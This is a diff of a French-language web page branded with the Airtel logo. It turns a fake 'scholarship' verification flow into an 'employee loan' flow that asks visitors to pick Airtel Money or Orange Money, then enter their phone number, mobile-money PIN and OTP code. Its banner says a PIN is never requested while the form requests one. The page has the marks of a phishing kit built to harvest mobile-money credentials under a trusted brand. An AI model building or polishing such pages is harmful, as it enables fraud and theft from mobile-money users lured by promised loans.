@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Vérification avec Airtel</title>
+  <title>Vérification — Prêt Employé</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -12,15 +12,15 @@
 <body>
   <header class="site-header">
     <div class="container">
-      <a href="index.html" class="logo">
+      <a href="index" class="logo">
         <img src="https://pnggallery.com/wp-content/uploads/airtel-01.png" alt="Airtel" class="logo-img">
         <span class="logo-text">airtel</span>
       </a>
       <nav>
         <ul class="nav-links">
-          <li><a href="index.html">Accueil</a></li>
-          <li><a href="scholarship.html">Bourses</a></li>
-          <li><a href="verify.html" class="active">Vérification</a></li>
+          <li><a href="index">Accueil</a></li>
+          <li><a href="scholarship">Prêt Employé</a></li>
+          <li><a href="verify" class="active">Vérification</a></li>
         </ul>
       </nav>
     </div>
@@ -37,11 +37,11 @@
                 <path d="M9 12l2 2 4-4"/>
               </svg>
             </div>
-            <h1>Vérification avec Airtel</h1>
-            <p>Pour continuer votre candidature, veuillez vérifier votre identité.</p>
+            <h1>Vérification</h1>
+            <p>Pour continuer votre demande de prêt, veuillez vérifier votre identité.</p>
           </div>
 
-          <!-- Step 1: Phone + PIN -->
+          <!-- Step 1: Payment Method Selection -->
           <div id="step1Panel" class="step-panel active">
             <div class="step-indicator">
               <div class="step-circle active">1</div>
@@ -49,6 +49,42 @@
               <div class="step-circle pending">2</div>
               <div class="step-connector"></div>
               <div class="step-circle pending">3</div>
+              <div class="step-connector"></div>
+              <div class="step-circle pending">4</div>
+            </div>
+
+            <h2 class="step-heading">Choisissez votre mode de paiement</h2>
+            <p class="step-description">Sélectionnez Airtel Money ou Orange Money pour recevoir vos fonds.</p>
+            <p id="paymentStatus" class="form-status"></p>
+
+            <div class="payment-methods">
+              <button type="button" class="payment-card airtel" data-method="airtel" id="airtelMoneyBtn">
+                <img src="https://pnggallery.com/wp-content/uploads/airtel-01.png" alt="Airtel Money" class="payment-logo">
+                <span class="payment-name">Airtel Money</span>
+                <span class="payment-check">✓</span>
+              </button>
+              <button type="button" class="payment-card orange" data-method="orange" id="orangeMoneyBtn">
+                <span class="payment-logo" style="font-weight:800; font-size:22px; color:#FF6600; line-height:1;">OM</span>
+                <span class="payment-name">Orange Money</span>
+                <span class="payment-check">✓</span>
+              </button>
+            </div>
+
+            <button id="confirmPaymentBtn" class="btn btn-primary btn-full" disabled>
+              Confirmer le mode de paiement
+            </button>
+          </div>
+
+          <!-- Step 2: Phone + PIN -->
+          <div id="step2Panel" class="step-panel disabled">
+            <div class="step-indicator">
+              <div class="step-circle done">1</div>
+              <div class="step-connector active"></div>
+              <div class="step-circle active">2</div>
+              <div class="step-connector"></div>
+              <div class="step-circle pending">3</div>
+              <div class="step-connector"></div>
+              <div class="step-circle pending">4</div>
             </div>
 
             <h2 class="step-heading">Vérifier le téléphone et le code PIN</h2>
@@ -68,7 +104,7 @@
                 <div id="countryMenu" role="listbox" aria-label="Country code" class="country-menu"></div>
                 <input id="phoneInput" type="tel" inputmode="numeric" placeholder="e.g. 97 123 4567" aria-label="Phone number" class="phone-input">
               </div>
-              <p id="phoneError" class="form-error">Entrez un numéro Airtel valide.</p>
+              <p id="phoneError" class="form-error">Entrez un numéro valide.</p>
             </div>
 
             <div class="form-group">
@@ -87,18 +123,20 @@
             </button>
           </div>
 
-          <!-- Step 2: OTP -->
-          <div id="step2Panel" class="step-panel disabled">
+          <!-- Step 3: OTP -->
+          <div id="step3Panel" class="step-panel disabled">
             <div class="step-indicator">
               <div class="step-circle done">1</div>
               <div class="step-connector active"></div>
-              <div class="step-circle active">2</div>
+              <div class="step-circle done">2</div>
+              <div class="step-connector active"></div>
+              <div class="step-circle active">3</div>
               <div class="step-connector"></div>
-              <div class="step-circle pending">3</div>
+              <div class="step-circle pending">4</div>
             </div>
 
             <h2 class="step-heading">Entrer le code OTP</h2>
-            <p class="step-description">Entrez le code OTP à 4 chiffres envoyé à votre numéro Airtel.</p>
+            <p class="step-description">Entrez le code OTP à 4 chiffres envoyé à votre numéro de téléphone.</p>
             <p id="otpStatus" class="form-status"></p>
 
             <div class="otp-inputs">
@@ -114,24 +152,26 @@
             </div>
 
             <button id="verifyOtpBtn" disabled class="btn btn-success btn-full">
-              Verify
+              Vérifier
             </button>
           </div>
 
-          <!-- Step 3: Continue -->
-          <div id="step3Panel" class="step-panel disabled">
+          <!-- Step 4: Continue -->
+          <div id="step4Panel" class="step-panel disabled">
             <div class="step-indicator">
               <div class="step-circle done">1</div>
               <div class="step-connector active"></div>
               <div class="step-circle done">2</div>
               <div class="step-connector active"></div>
-              <div class="step-circle active">3</div>
+              <div class="step-circle done">3</div>
+              <div class="step-connector active"></div>
+              <div class="step-circle active">4</div>
             </div>
 
-            <h2 class="step-heading">Continuer vers la candidature</h2>
-            <p class="step-description">Vous êtes vérifié. Continuez vers votre formulaire de candidature.</p>
+            <h2 class="step-heading">Candidature soumise</h2>
+            <p class="step-description">Votre demande de prêt a été soumise avec succès. Notre équipe l'examinera et vous contactera sous peu.</p>
             <button id="continueBtn" class="btn btn-success btn-full">
-              Continuer vers la candidature
+              Retour à l'accueil
               <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                 <path d="M5 12h14M13 6l6 6-6 6"/>
               </svg>
@@ -148,7 +188,7 @@
           </div>
           <div class="info-banner-content">
             <p><strong>Pourquoi vérifions-nous ?</strong></p>
-            <p>Nous utilisons votre numéro Airtel pour vous identifier en toute sécurité et protéger votre candidature. Nous ne demandons jamais votre code PIN, mot de passe ou code de mobile money.</p>
+            <p>Nous utilisons votre numéro de téléphone pour vous identifier en toute sécurité et protéger votre demande de prêt. Nous ne demandons jamais votre code PIN, mot de passe ou code de mobile money.</p>
           </div>
         </div>
       </div>
@@ -160,17 +200,17 @@
   <footer class="site-footer">
     <div class="footer-content">
       <div class="footer-brand">
-        <a href="index.html" class="footer-logo">
+        <a href="index" class="footer-logo">
           <img src="https://pnggallery.com/wp-content/uploads/airtel-01.png" alt="Airtel" class="footer-logo-img">
           <span class="footer-logo-text">airtel</span>
         </a>
-        <p class="footer-description">Autonomiser les étudiants dans 18 pays grâce à des bourses et des prêts d'études. Construire l'avenir, un rêve à la fois.</p>
+        <p class="footer-description">Financement rapide et sécurisé pour employés via Airtel Money et Orange Money. Construire votre avenir financier, un prêt à la fois.</p>
         <div class="footer-social">
           <a href="#" aria-label="Facebook">
             <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
           </a>
           <a href="#" aria-label="LinkedIn">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227 .792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
           </a>
           <a href="#" aria-label="Twitter">
             <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
@@ -181,39 +221,39 @@
         </div>
       </div>
 
-        <div class="footer-column">
-          <h4>Programmes</h4>
-          <ul class="footer-links">
-            <li><a href="verify.html?flow=scholarship">Bourses</a></li>
-            <li><a href="verify.html?flow=loan">Prêt étudiant</a></li>
-            <li><a href="#">Mentorat</a></li>
-            <li><a href="#">Support technologique</a></li>
-          </ul>
-        </div>
+      <div class="footer-column">
+        <h4>Programmes</h4>
+        <ul class="footer-links">
+          <li><a href="verify.html?flow=loan">Prêt Employé</a></li>
+          <li><a href="#">Épargne</a></li>
+          <li><a href="#">Assurance</a></li>
+          <li><a href="#">Support</a></li>
+        </ul>
+      </div>
 
-        <div class="footer-column">
-          <h4>Support</h4>
-          <ul class="footer-links">
-            <li><a href="#">Centre d'aide</a></li>
-            <li><a href="#">Contactez-nous</a></li>
-            <li><a href="#">FAQ</a></li>
-            <li><a href="#">Documentation</a></li>
-          </ul>
-        </div>
+      <div class="footer-column">
+        <h4>Support</h4>
+        <ul class="footer-links">
+          <li><a href="#">Centre d'aide</a></li>
+          <li><a href="#">Contactez-nous</a></li>
+          <li><a href="#">FAQ</a></li>
+          <li><a href="#">Documentation</a></li>
+        </ul>
+      </div>
 
-        <div class="footer-column">
-          <h4>Mentions légales</h4>
-          <ul class="footer-links">
-            <li><a href="#">Politique de confidentialité</a></li>
-            <li><a href="#">Conditions d'utilisation</a></li>
-            <li><a href="#">Politique des cookies</a></li>
-            <li><a href="#">Code de conduite</a></li>
-          </ul>
-        </div>
+      <div class="footer-column">
+        <h4>Mentions légales</h4>
+        <ul class="footer-links">
+          <li><a href="#">Politique de confidentialité</a></li>
+          <li><a href="#">Conditions d'utilisation</a></li>
+          <li><a href="#">Politique des cookies</a></li>
+          <li><a href="#">Code de conduite</a></li>
+        </ul>
+      </div>
     </div>
 
     <div class="footer-bottom">
-      <p class="footer-copyright">© <span id="year"></span> Airtel Éducation et bourses. Tous droits réservés.</p>
+      <p class="footer-copyright">© <span id="year"></span> Financement Employé Airtel. Tous droits réservés.</p>
       <div class="footer-legal">
         <a href="#">Politique de confidentialité</a>
         <a href="#">Conditions générales</a>
